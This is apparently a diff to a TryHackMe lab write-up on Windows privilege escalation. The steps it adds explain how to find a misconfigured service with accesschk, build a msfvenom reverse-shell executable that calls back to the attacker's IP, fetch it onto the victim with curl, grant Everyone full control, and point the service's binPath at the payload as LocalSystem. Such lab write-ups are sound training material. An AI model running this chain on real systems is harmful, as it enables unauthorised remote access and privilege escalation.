@@ -345,7 +345,7 @@ C:\PROGRA~2\SYSTEM~1>dir
                3 Dir(s)  14,755,926,016 bytes free
 ```
 
-12. `icacls <PAYLOAD> /grant EVERYONE:F` from the compromised Windows machine to grant full control (read, write, and execute permissions) to the "Everyone" group for our payload
+12. `icacls <PAYLOAD> /grant Everyone:F` from the compromised Windows machine to grant full control (read, write, and execute permissions) to the "Everyone" group for our payload
 ```PowerShell
 C:\PROGRA~2\SYSTEM~1>icacls WService.exe /grant Everyone:F
 processed file: WService.exe
@@ -535,7 +535,7 @@ THM{QUOTES_EVERYWHERE}
 ### Insecure Service Permissions
 
 1. Started this task's machine
-2. 
+2. `<Accesschk EXECUTABLE LOCATION> -qlc <SERVICE>` from the compromised Windows machine to use the [Accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) executable, which is a command-line utility developed by Microsoft Sysinternals, to view the security descriptors and permissions on our target service, which revealed that the BUILTIN\Users groups has the `SERVICE_ALL_ACCESS` permissions, meaning that any user can reconfigure the service
 ```PowerShell
 C:\Users\thm-unpriv>C:\tools\AccessChk\accesschk64.exe -qlc thmservice
 
@@ -579,7 +579,7 @@ thmservice
         SERVICE_ALL_ACCESS
 ```
 
-3. 
+3. `msfvenom -p <PAYLOAD> LHOST=<ATTACKER IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <OUTPUT FILE>` from our attack machine to generate a custom reverse shell payload executable (.exe)
 ```Bash
 root@ip-10-10-6-207:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.6.207 LPORT=9999 -f exe-service -o ReverseShell.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -590,13 +590,13 @@ Final size of exe-service file: 48640 bytes
 Saved as: ReverseShell.exe
 ```
 
-4. 
+4. `python3 -m <MODULE>` from our attack machine to start a simple HTTP server on our local machine using Python 3's built in HTTP server module (`http.server`)
 ```Bash
 root@ip-10-10-6-207:~# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
-5. 
+5. `curl <ATTACK MACHINE HTTP SERVER>:<PAYLOAD FILE PATH> -O <OUTPUT FILE>` from the compromised Windows machine to make an HTTP request to our previously set up Python server on our attack machine to download our previously generated reverse shell payload executable onto the compromised machine
 ```PowerShell
 C:\Users\thm-unpriv>curl http://10.10.6.207:8000/ReverseShell.exe -O ReverseShell.exe
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -605,14 +605,14 @@ C:\Users\thm-unpriv>curl http://10.10.6.207:8000/ReverseShell.exe -O ReverseShel
 curl: (6) Could not resolve host: ReverseShell.exe
 ```
 
-6. 
+6. `icacls <PAYLOAD> /grant Everyone:F` from the compromised Windows machine to grant full control (read, write, and execute permissions) to the "Everyone" group for our payload
 ```PowerShell
 C:\Users\thm-unpriv>icacls C:\Users\thm-unpriv\ReverseShell.exe /grant Everyone:F
 processed file: C:\Users\thm-unpriv\ReverseShell.exe
 Successfully processed 1 files; Failed processing 0 files
 ```
 
-7. 
+7. `sc config <SERVICE> binPath= "<BINARY PATH>" obj= <SERVICE ACCOUNT>` from the compromised Windows machine 
 ```PowerShell
 C:\Users\thm-unpriv>sc config THMService binPath= "C:\Users\thm-unpriv\ReverseShell.exe" obj= LocalSystem
 [SC] ChangeServiceConfig SUCCESS
